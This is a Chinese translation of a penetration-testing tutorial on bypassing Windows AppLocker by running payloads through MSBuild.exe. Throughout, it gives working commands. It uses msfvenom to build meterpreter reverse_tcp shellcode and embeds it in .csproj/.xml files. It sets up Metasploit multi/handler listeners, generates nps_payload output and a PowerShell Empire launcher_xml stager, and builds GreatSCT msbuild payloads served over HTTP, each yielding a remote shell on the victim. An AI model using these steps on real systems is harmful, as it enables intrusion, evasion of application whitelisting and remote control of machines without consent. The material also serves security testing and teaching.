**在这篇文章中，我们将为大家介绍如何绕过AppLocker。在上一篇文章，即“[Windows
AppLocker策略入门指南](https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/)”中，我们为读者介绍了如何通过AppLocker规则来定义应用程序控制策略，以及如何实施这些策略。接下来，我们将介绍如何借助MSbuild.exe绕过AppLocker策略。**

## 大概内容

> 1.MSbuild.exe简介
>
> 2.使用Msfvenom生成CSharp文件
>
> 3.利用MSbuild生成XML文件
>
> 4.Nps_payload脚本
>
> 5.Powershell
>
> 6.GreatSCT

##  **MSbuild.exe简介**

Visual Studio使用MSBuild，但它不依赖于Visual Studio。通过 在项目或解决方案文件上调用
msbuild.exe，您可以在未安装Visual Studio的环境中组织和构建产品。Visual
Studio使用MSBuild加载和构建托管项目。Visual Studio中的项目文件（.csproj， .vbproj，
.vcxproj和其他）包含MSBuild XML代码。

## 使用Msfvenom生成CSharp文件

我们使用Microsoft
VisualStudio创建以MSBuild格式保存的、带有`*.csproj`后缀的C#代码，以便可以使用MSBuild平台将其编译为可执行程序。借助于一个恶意的构建的过程，我们可以获得受害者计算机的反向shell。接下来，我们要生成file.csproj文件，为此，首先需要通过msfvenom生成一个基于C#的shellcode。之后，将该shellcode放入我们的file.csproj中，具体如下所示。

    
    
     msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f csharp

![1.png](https://image.3001.net/images/20190308/1552051605_5c826d9543cdb.png!small)上面的shellcode放入xml文件中，并且，我们可以从github下载这个xml文件，其中存放MSBuild要编译和执行的代码。该xml文件应另存为file.csproj
，所这样，必须通过MSBuild运行file.csproj才能生成Meterpreter会话。
注意：要替换C＃shellcode中shellcode的值，然后，将buf重命名为shellcode，如下图所示。  
![2.png](https://image.3001.net/images/20190308/1552051613_5c826d9d82192.png!small)我们可以从Visual
Studio或从命令行窗口中运行MSBuild。通过Visual Studio，不仅可以编译应用程序，同时，还能指定编译后的代码适用于哪个版本的.NET
Framework 。例如，同一个应用程序源代码，既可以编译为适用于32位平台上的.NET
Framework2.0环境中的程序，也可以让编译好的代码运行于64位平台上的.NET
Framework4.5环境。现在启动multi/handler以获取Meterpreter会话，并在目标路径C:\Windows\Microsoft.NET\fr
amework\v4.0.30319中使用msbuild.exe运行file.csproj文件，具体如下所示。

![3.png](https://image.3001.net/images/20190308/1552051621_5c826da57cd48.png!small)

    
    
    use exploit/multi/handler
    msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf exploit(multi/handler) > set lhost 192.168.1.109
    msf exploit(multi/handler) > set lport 1234
    msf exploit(multi/handler) > exploit
    

这样就得到了meterpreter会话，如下所示：  
![4.png](https://image.3001.net/images/20190308/1552051628_5c826dac552b3.png!small)

## 利用MSbuild生成XML文件

如上所述，MSBuild使用了一种基于xml的项目文件格式，这种格式不仅简单易懂，并且易于扩展，因此，我们可以将上面生成的file.csproj重命名为`file.xml`，然后，再次使用msbuild.exe在目标路径`C:\Windows\Microsoft.Net\fr
amework\v4.0.30319`上运行file.xml文件，具体如图所示。

    
    
     C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe file.xml

![5.png](https://image.3001.net/images/20190308/1552051634_5c826db2c3749.png!small)

    
    
    use exploit/multi/handler
    msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf exploit(multi/handler) > set lhost 192.168.1.109
    msf exploit(multi/handler) > set lport 1234
    msf exploit(multi/handler) > exploit
    

我们这样就得到了受害者的meterpreter会话，如下所示：  
![6.png](https://image.3001.net/images/20190308/1552051641_5c826db95d7b2.png!small)

## Nps_Payload脚本

该脚本用于生成绕过入侵检测的payload。当然，这里用到了多种已经公开的技术。该脚本是由Larry
Spohn（@_Spoonman1091）撰写的，但是Payload则是由Ben
Mauch（@_Ben0xA）编写的。该脚本可以从github下载。Nps_payload能够生成可以通过msbuild.exe和mshta.exe执行的payload，以通过meterpreter会话获取受害者计算机的反向连接。
我们可以按照以下步骤来生成payload：1从github下载nps
payload后，运行`./nps_payload.py`脚本。2.按1，选择任务`“generatemsbuild/nps/msf”`3.再次按1，选择`payload“windows/meterpreter/reverse_tcp”`这样一来，将在xml文件中生成payload，然后从目标位置`C:\Windows\Microsoft.Net\fr
amework\v4.0.30319`发送该文件，具体如前所述，同时，在新终端中运行以下命令以启动侦听器。

    
    
    msfconsole -r msbuld_nps.rc

![7.png](https://image.3001.net/images/20190308/1552051648_5c826dc09abb1.png!small)重复上面的步骤，在命令提示符下执行msbuild_nps.xm
l，并通过Meterpreter获得反向连接，具体如下所示：

    
    
    C:\Windows\Microsoft.NET\fr amework\v4.0.30319\MSBuild.exemsbuild_nps.xml

![8.png](https://image.3001.net/images/20190308/1552051655_5c826dc71c10d.png!small)

## PowerShell Empire

接下来，我们将为读者介绍另一种针对Msbuild的攻击方法，为此，我们需要用到empire。实际上，Empire是一个后续利用框架。关于Empire的使用指南，请访问下面的文章：<<https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/>>启动Empipre框架后，请键入listener命令，以检查是否存在处于活动状态的侦听器。正如您在下面的图像中看到的，这里并没有处于活动状态的侦听器。因此，我们需要设置一个侦听器，具体命令如下所示：

    
    
    listeners
    uselistner http
    set Host http://192.168.1.107
    execute
    

使用上述命令，您将拥有一个活动的侦听器。键入back以退出侦听器，以便您可以启动PowerShell。对于我们的MSBuild攻击，我们将使用stager。

    
    
    usestager windows/launcher_xml
    set listener http
    execute
    

UseStager将创建一个恶意代码文件，该文件将保存在`/tmp`目录下面名为`launcher.xml`的文件中。  
![9.png](https://image.3001.net/images/20190308/1552051663_5c826dcf3bbd3.png!small)一旦该文件被运行，我们就能在侦听器上看到相应的运行结果。为了在受害者机器上面运行该文件，需要执行下列命令：

    
    
    cd C:\Windows\Microsoft.NET\framework\v4.0.30319\
    MSBuild.exe launcher.xml

![10.png](https://image.3001.net/images/20190308/1552051670_5c826dd63964f.png!small)要查看是否有会话已打开，请键入“agents”。这样，将显示我们拥有的会话的名称列表。若要访问某会话，可以使用如下所示的命令：

    
    
    interact A8H14C7L
    

上面的命令将授予您对指定会话的访问权限。

    
    
    sysinfoinfo

![11.png](https://image.3001.net/images/20190308/1552051677_5c826ddd20854.png!small)

## GreatSCT

GreatSCT是一个允许您使用Metasploit漏洞并允许它绕过大多数反病毒的工具。GreatSCT其下载地址为：
<<https://github.com/GreatSCT/GreatSCT>>下载并运行该软件后，可以通过以下命令来访问各个功能模块：

    
    
    use Bypass

![12.png](https://image.3001.net/images/20190308/1552051682_5c826de2dd56a.png!small)现在，我们来查看payload的类型列表，具体命令如下所示：

![13.png](https://image.3001.net/images/20190308/1552051692_5c826dec0ff04.png!small)这样，我们就可以根据攻击目标，来选择相应的payload了。我们需要键入以下命令：

    
    
    use msbuild/meterpreter/rev_tcp.py

![14.png](https://image.3001.net/images/20190308/1552051698_5c826df216f9d.png!small)输入以下命令：

    
    
    set lhost 192.168.1.107
    generate

![15.png](https://image.3001.net/images/20190308/1552051704_5c826df81b402.png!small)当生成payload时，会要求为其指定一个名称。默认情况下，它将使用“payload”进行命名。不过，这里将msbuild指定为该payload的名称，输出代码将保存在xml中。  
![16.png](https://image.3001.net/images/20190308/1552051709_5c826dfd9b161.png!small)现在，它生成了两个文件。一个是metasploit的RC文件，另一个是msbuild.xml文件。
接下来，我们需要在`/usr/share/greatsct-output/source`目录中输入以下命令，以便启动Python服务器：

    
    
    python -m SimpleHTTPServer 80
    

![17.png](https://image.3001.net/images/20190308/1552051715_5c826e035525c.png!small)受害者的机器运行该文件：

    
    
    cd C:\Windows\Microsoft.NET\fr amework\v4.0.30319\
    MSBuild.exe msbuild.xml

![18.png](https://image.3001.net/images/20190308/1552051721_5c826e0943540.png!small)启动multi/handler。键入下列命令：

    
    
    msfconsole -r/usr/share/greatsct-output/handlers/payload.rc
    

获得了一个Meterpreter会话。  
![19.png](https://image.3001.net/images/20190308/1552051727_5c826e0f4e2cf.png!small)***参考来源：[forcepoint](https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/)，由周大涛编译，转载请注明来自FreeBuf.COM **  

